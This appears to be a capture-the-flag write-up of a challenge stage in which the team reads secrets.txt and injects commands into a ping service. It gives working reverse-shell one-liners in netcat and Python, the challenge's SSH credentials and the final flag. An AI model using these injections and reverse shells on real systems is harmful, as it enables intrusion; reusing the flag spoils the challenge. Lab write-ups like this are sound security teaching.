# 03
In the second flag, there is a hint to check secrets.txt. So we try this, by doing a request to `submarine-api` with `/view?file=secrets.txt` which contains credentials for the ssh server at `submarine-sonar`. 

> We did actually already find these by running `''; ps aux` and looking at the commands other teams had run since it was a single instance for all teams.

We were able to setup a reverse shell since the webserver hosting ping had netcat installed. We used this command for the reverse shell: `''; nc <OUR IP> 8080 -e /bin/sh `, but found it was more stable with python using: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<OUR IP>",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`. Then the receive could run `nc -lnvp 8080`. 

Through the reverse shell we could log onto `submarine-sonar` with the user `admiral` and the password `deep_sea_explorer_2024`. Once we are connected to `submarine-sonar` we do a search to see if we can find any files called any containing  `flag.txt` and we find `/mnt/1/final_flag.txt`.

Running `cat` on that reveals the final flag: `HF-xzBiWnucofINWHlnWfGmoOQfqqFxeKbF`